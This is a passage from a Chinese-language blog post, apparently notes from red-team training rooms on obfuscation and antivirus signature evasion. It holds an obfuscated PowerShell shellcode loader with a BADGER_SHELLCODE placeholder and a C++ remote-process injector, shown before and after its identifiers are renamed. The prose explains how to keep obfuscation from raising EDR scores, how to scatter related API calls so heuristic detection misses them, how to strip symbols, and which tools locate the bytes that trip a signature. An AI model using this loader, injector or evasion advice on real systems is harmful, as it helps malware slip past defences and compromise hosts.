#E06C75">$io9iH</span><span style="color: #ABB2BF">), [</span><span style="color: #C678DD">reflection.bindingflags</span><span style="color: #ABB2BF">] </span><span style="color: #98C379">&quot;Public,Static&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">System.Reflection.CallingConventions</span><span style="color: #ABB2BF">]::Any, </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">((</span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> System.Runtime.InteropServices.HandleRef).GetType(), [</span><span style="color: #C678DD">string</span><span style="color: #ABB2BF">]), </span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">)).Invoke(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">([</span><span style="color: #C678DD">System.Runtime.InteropServices.HandleRef</span><span style="color: #ABB2BF">](</span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> System.Runtime.InteropServices.HandleRef((</span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> IntPtr), (</span><span style="color: #E06C75">$a.GetMethod</span><span style="color: #ABB2BF">((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Qui5i</span><span style="color: #ABB2BF">))).Invoke(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$vmod</span><span style="color: #ABB2BF">)))), </span><span style="color: #E06C75">$vproc</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Get-TDef</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">Param</span><span style="color: #ABB2BF"> (</span></span><span class="line"><span style="color: #ABB2BF">        [</span><span style="color: #56B6C2">Parameter</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75; font-style: italic">Position</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75; font-style: italic">Mandatory</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">$True</span><span style="color: #ABB2BF">)] [</span><span style="color: #C678DD">Type</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$var_parameters</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">        [</span><span style="color: #56B6C2">Parameter</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75; font-style: italic">Position</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)] [</span><span style="color: #C678DD">Type</span><span style="color: #ABB2BF">] </span><span style="color: #E06C75">$var_return_type</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Void</span><span style="color: #ABB2BF">]</span></span><span class="line"><span style="color: #ABB2BF">    )</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$vtdef</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">AppDomain</span><span style="color: #ABB2BF">]::CurrentDomain.DefineDynamicAssembly((</span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> System.Reflection.AssemblyName((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Ait1m</span><span style="color: #ABB2BF">))), [</span><span style="color: #C678DD">System.Reflection.Emit.AssemblyBuilderAccess</span><span style="color: #ABB2BF">]::Run).DefineDynamicModule((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF">  </span><span style="color: #E06C75">$ahv3I</span><span style="color: #ABB2BF">), </span><span style="color: #D19A66">$false</span><span style="color: #ABB2BF">).DefineType((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Moo5y</span><span style="color: #ABB2BF">), (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$ooR5o</span><span style="color: #ABB2BF">), [</span><span style="color: #C678DD">System.MulticastDelegate</span><span style="color: #ABB2BF">])</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$vtdef.DefineConstructor</span><span style="color: #ABB2BF">((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Reib3</span><span style="color: #ABB2BF">), [</span><span style="color: #C678DD">System.Reflection.CallingConventions</span><span style="color: #ABB2BF">]::Standard, </span><span style="color: #E06C75">$var_parameters</span><span style="color: #ABB2BF">).SetImplementationFlags((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Reo5o</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$vtdef.DefineMethod</span><span style="color: #ABB2BF">((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$ii5Ie</span><span style="color: #ABB2BF">), (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Thah8</span><span style="color: #ABB2BF">), </span><span style="color: #E06C75">$var_return_type</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$var_parameters</span><span style="color: #ABB2BF">).SetImplementationFlags((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Reo5o</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$vtdef.CreateType</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]]</span><span style="color: #E06C75">$vopcode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(BADGER_SHELLCODE)</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">$vbuf</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> ([</span><span style="color: #C678DD">System.Runtime.InteropServices.Marshal</span><span style="color: #ABB2BF">]::GetDelegateForFunctionPointer((</span><span style="color: #56B6C2">Get-PA</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$xee2N</span><span style="color: #ABB2BF">) (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$AD0Pi</span><span style="color: #ABB2BF">)), (</span><span style="color: #56B6C2">Get-TDef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">([</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]) ([</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">])))).Invoke([</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">]::Zero, </span><span style="color: #E06C75">$vopcode.Length</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3000</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x04</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">System.Runtime.InteropServices.Marshal</span><span style="color: #ABB2BF">]::Copy(</span><span style="color: #E06C75">$vopcode</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$vbuf</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$vopcode.length</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">([</span><span style="color: #C678DD">System.Runtime.InteropServices.Marshal</span><span style="color: #ABB2BF">]::GetDelegateForFunctionPointer((</span><span style="color: #56B6C2">Get-PA</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$xee2N</span><span style="color: #ABB2BF">) (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$ahb3O</span><span style="color: #ABB2BF">)), (</span><span style="color: #56B6C2">Get-TDef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">([</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">].MakeByRefType()) ([</span><span style="color: #C678DD">Bool</span><span style="color: #ABB2BF">])))).Invoke(</span><span style="color: #E06C75">$vbuf</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$vopcode.Length</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x20</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF">](</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)) | </span><span style="color: #56B6C2">Out-Null</span></span><span class="line"><span style="color: #ABB2BF">([</span><span style="color: #C678DD">System.Runtime.InteropServices.Marshal</span><span style="color: #ABB2BF">]::GetDelegateForFunctionPointer((</span><span style="color: #56B6C2">Get-PA</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$xee2N</span><span style="color: #ABB2BF">) (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$yhe4c</span><span style="color: #ABB2BF">)), (</span><span style="color: #56B6C2">Get-TDef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">([</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">].MakeByRefType()) ([</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">])))).Invoke(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$vbuf</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF">](</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)) | </span><span style="color: #56B6C2">Out-Null</span></span></code></pre></div></div></figure><p>你可能会注意到一些 cmdlet 和函数保持其原始状态……这是为什么呢？你可能希望创建一个应用程序，它在被检测后仍然能够迷惑逆向工程师，但可能不会显得可疑。如果恶意软件开发者混淆所有 cmdlet 和函数，这会提高解释型和编译型语言的熵，从而导致 EDR 警报分数更高。如果一个解释型代码片段在日志中显得看似随机或明显经过大量混淆，也可能导致其显得可疑。</p><h4 id="Code-Structure-代码结构"><a href="#Code-Structure-代码结构" class="headerlink" title="Code Structure 代码结构"></a>Code Structure 代码结构</h4><ol><li><strong>添加垃圾代码（Junk Code）和代码重排（Reordering Code）</strong><ul><li><strong>目的</strong>：增加程序的<strong>复杂性</strong>，迷惑分析师。</li><li><strong>原理</strong>：在恶意代码中插入大量无用的、不执行的指令或代码块，或者打乱代码块的原始顺序。这使得分析师难以从一堆杂乱的代码中找出真正的恶意逻辑。</li><li><strong>适用范围</strong>：这种技术尤其适用于<strong>解释型语言</strong>（如 Python），因为它们的源代码通常是可见的，分析师可以直接查看。</li></ul></li><li><strong>分离相关代码（Separation of Related Code）</strong><ul><li><strong>目的</strong>：规避<strong>启发式签名（Heuristic Signature）</strong>检测。</li><li><strong>原理</strong>：启发式引擎会分析代码的<strong>上下文</strong>。例如，如果 <code>OpenFile</code> 和 <code>EncryptFile</code> 这两个 API 调用在代码中紧挨着出现，启发式引擎就可能判断这是一个勒索软件。攻击者通过<strong>随机化</strong>这些相关代码的出现位置，将它们分散在程序的各个角落，从而破坏这种上下文关联，欺骗引擎，让它认为这些是无害的独立操作。</li></ul></li></ol><h4 id="File-Compilation-Properties-文件和编译属性"><a href="#File-Compilation-Properties-文件和编译属性" class="headerlink" title="File &amp; Compilation Properties 文件和编译属性"></a>File &amp; Compilation Properties 文件和编译属性</h4><p>当程序编译为调试版本时，编译器将包含一个符号文件。符号通常有助于调试二进制映像，并且可以包含全局和局部变量、函数名称和入口点。攻击者必须意识到这些可能的问题，以确保正确的编译实践，并且没有信息泄露给分析人员。</p><p>对攻击者来说幸运的是，符号文件可以通过编译器或在编译后轻松移除。要从像 Visual Studio 这样的编译器中移除符号，我们需要将编译目标从 <code>Debug</code> 更改为 <code>Release</code> ，或者使用像 mingw 这样更轻量级的编译器。</p><p>如果我们需要从预编译镜像中移除符号，可以使用命令行工具： <code>strip</code> 。</p><p>以编译型语言为例，我们可以观察一个用 C++ 编写的进程注入器，它向命令行报告其状态。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;windows.h&quot;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;iostream&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;string&gt;</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">namespace</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">std</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">char*</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #ABB2BF">[])</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> shellcode[] </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">HANDLE processHandle;</span></span><span class="line"><span style="color: #ABB2BF">HANDLE remoteThread;</span></span><span class="line"><span style="color: #ABB2BF">PVOID remoteBuffer;</span></span><span class="line"><span style="color: #ABB2BF">string leaked </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;This was leaked in the strings&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">processHandle </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, FALSE, </span><span style="color: #61AFEF">DWORD</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])));</span></span><span class="line"><span style="color: #ABB2BF">cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Handle obtained for&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> processHandle;</span></span><span class="line"><span style="color: #ABB2BF">remoteBuffer </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(processHandle, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, sizeof shellcode, (MEM_RESERVE </span><span style="color: #56B6C2">|</span><span style="color: #ABB2BF"> MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span></span><span class="line"><span style="color: #ABB2BF">cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Buffer Created&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(processHandle, remoteBuffer, shellcode, sizeof shellcode, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Process written with buffer&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> remoteBuffer;</span></span><span class="line"><span style="color: #ABB2BF">remoteThread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(processHandle, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (LPTHREAD_START_ROUTINE)remoteBuffer, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">CloseHandle</span><span style="color: #ABB2BF">(processHandle);</span></span><span class="line"><span style="color: #ABB2BF">cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Closing handle&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> processHandle;</span></span><span class="line"><span style="color: #ABB2BF">cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> leaked;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>让我们使用字符串来准确查看此源代码编译时泄露了什么。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">C:\&gt;.\strings.exe &quot;\Injector.exe&quot;</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">Strings v2.54 - Search for ANSI and Unicode strings in binary images.</span></span><span class="line"><span style="color: #abb2bf">Copyright (C) 1999-2021 Mark Russinovich</span></span><span class="line"><span style="color: #abb2bf">Sysinternals - www.sysinternals.com</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">!This program cannot be run in DOS mode.</span></span><span class="line"><span style="color: #abb2bf">&gt;FU</span></span><span class="line"><span style="color: #abb2bf">z&#39;;</span></span><span class="line"><span style="color: #abb2bf">z&#39;;</span></span><span class="line"><span style="color: #abb2bf">...</span></span><span class="line"><span style="color: #abb2bf">[snip]</span></span><span class="line"><span style="color: #abb2bf">...</span></span><span class="line"><span style="color: #abb2bf">Y_^[</span></span><span class="line"><span style="color: #abb2bf">leaked</span></span><span class="line"><span style="color: #abb2bf">shellcode</span></span><span class="line"><span style="color: #abb2bf">2_^[]</span></span><span class="line"><span style="color: #abb2bf">...</span></span><span class="line"><span style="color: #abb2bf">[snip]</span></span><span class="line"><span style="color: #abb2bf">...</span></span><span class="line"><span style="color: #abb2bf">std::_Adjust_manually_vector_aligned</span></span><span class="line"><span style="color: #abb2bf">&quot;invalid argument&quot;</span></span><span class="line"><span style="color: #abb2bf">string too long</span></span><span class="line"><span style="color: #abb2bf">This was leaked in the strings</span></span><span class="line"><span style="color: #abb2bf">Handle obtained for</span></span><span class="line"><span style="color: #abb2bf">Buffer Created</span></span><span class="line"><span style="color: #abb2bf">Process written with buffer</span></span><span class="line"><span style="color: #abb2bf">Closing handle</span></span><span class="line"><span style="color: #abb2bf">std::_Allocate_manually_vector_aligned</span></span><span class="line"><span style="color: #abb2bf">bad allocation</span></span><span class="line"><span style="color: #abb2bf">Stack around the variable &#39;</span></span><span class="line"><span style="color: #abb2bf">...</span></span><span class="line"><span style="color: #abb2bf">[snip]</span></span><span class="line"><span style="color: #abb2bf">...</span></span><span class="line"><span style="color: #abb2bf">8@9H9T9X9\\9h9|9</span></span><span class="line"><span style="color: #abb2bf">:$:(:D:H:</span></span><span class="line"><span style="color: #abb2bf">@1p1</span></span></code></pre></div></div></figure><p>所有的 iostream 都写入了字符串，甚至 shellcode 字节数组也泄露了。这是一个较小的程序，所以想象一下一个功能完善且未混淆的程序会是什么样子！</p><p>我们可以删除注释并替换有意义的标识符来解决这个问题，或者在 Windows 端编译好，拖到 Linux 端过去用 <code>strip filename</code> 就 OK 了，当然你也可以手动处理变量名，不过在这个例子中，你要把那个 string 和打印的字符串处理掉，strip 只会处理你的变量名。</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;windows.h&quot;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char*</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> awoler</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">HANDLE awerfu;</span></span><span class="line"><span style="color: #ABB2BF">HANDLE rwfhbf;</span></span><span class="line"><span style="color: #ABB2BF">PVOID iauwef;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">awerfu </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">, </span><span style="color: #61AFEF">DWORD</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])));</span></span><span class="line"><span style="color: #ABB2BF">iauwef </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(awerfu, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF"> awoler, (MEM_RESERVE </span><span style="color: #C678DD">|</span><span style="color: #ABB2BF"> MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(awerfu, iauwef, awoler, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF"> awoler, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">rwfhbf </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(awerfu, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (LPTHREAD_START_ROUTINE)iauwef, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">CloseHandle</span><span style="color: #ABB2BF">(awerfu);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h1 id="Signature-Evasion-特征码规避"><a href="#Signature-Evasion-特征码规避" class="headerlink" title="Signature Evasion 特征码规避"></a>Signature Evasion 特征码规避</h1><p>前几个房间提到了 Shellcode 会有特征，容易被杀软检测，然后又提到了杀软是怎么检测特征的，上一个房间教了混淆的原理，这个房间就是用来具体实践的。</p><h2 id="Signature-Identification-签名识别"><a href="#Signature-Identification-签名识别" class="headerlink" title="Signature Identification 签名识别"></a>Signature Identification 签名识别</h2><p>杀软是靠的特定的签名去识别恶意片段，所以我们需要找到程序中引起警报的片段。房间这里告诉我们用原生工具 <code>head</code> 、 <code>dd</code> 或 <code>split</code> 来分割已编译的二进制文件，我觉得这个挺繁琐的，后续可以用自动化工具完成这点。</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1">Find-AVSignature</a> 可以给定间隔对提供的字节范围进行分割，但这个也存在缺陷，他需要一个合适的间隔才能正常运行。如果我们给的间隔把一个签名直接在中间截断了，那么是不是就两段分割好的都找不到这个签名了？</p><p>另外这个脚本只观察二进制文件的字符串，而不是使用反病毒引擎的全部功能进行扫描，所以这里需要用其他工具去解决这个，例如 <a href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a>, <a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a>, 和 <a href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a>。</p><h3 id="ThreatCheck"><a href="#ThreatCheck" class="headerlink" title="ThreatCheck"></a>ThreatCheck</h3><p>ThreatCheck 是 DefenderCheck 